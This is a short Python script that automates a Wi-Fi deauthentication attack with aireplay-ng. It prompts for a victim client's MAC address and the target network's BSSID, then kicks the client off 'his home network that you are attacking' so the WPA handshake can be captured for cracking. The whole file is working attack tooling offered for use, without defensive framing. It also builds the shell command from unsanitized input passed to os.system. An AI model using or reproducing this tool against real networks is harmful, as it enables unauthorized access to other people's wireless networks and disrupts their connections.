#! /usr/bin/python
# -*- coding: utf-8 -*-
import os
import time
from termcolor import colored
a = os.system
print colored("Wait for a client to connect to his home network that you are attacking, and then", "green")
time.sleep( 5 )
client_mac_address = raw_input("Copy his mac address and print it here:")
time.sleep( 0.5 )
bssid = raw_input("Now re-enter the bssid of the wireless network:")
number_of_deauth_packets = raw_input("How many deauth packet you want to be sent? (0 will put no limit and will keep deauthenticating the client until you exit, we suggest that you use 2 or 4):")
time.sleep( 0.5 )
wireless_card = raw_input("enter the wireless card that you previously used:")
send_deauth = 'aireplay-ng -0 '+number_of_deauth_packets+' -a '+bssid+' -c '+client_mac_address+' '+wireless_card+''
a(send_deauth)
print colored("Thanks, I will kick the client out of his network so when he connect back we will capture the hanshake he made with the router, after we tell you this is done wait about 10 seconds and a message should appear on the first terminal telling you: WPA Hanshake: '+bssid+' ,in nothing appeared procced try deauthenticating another client", "green")
answer = raw_input("Have the handshake been captured? [Y]es/[N]o:")
if answer.upper() == 'Y':
	print colored("Hit Ctrl+C on the first terminal to proceed", "green")
	time.sleep( 3 )
	exit()
else:
		a(send_deauth)
		exit()
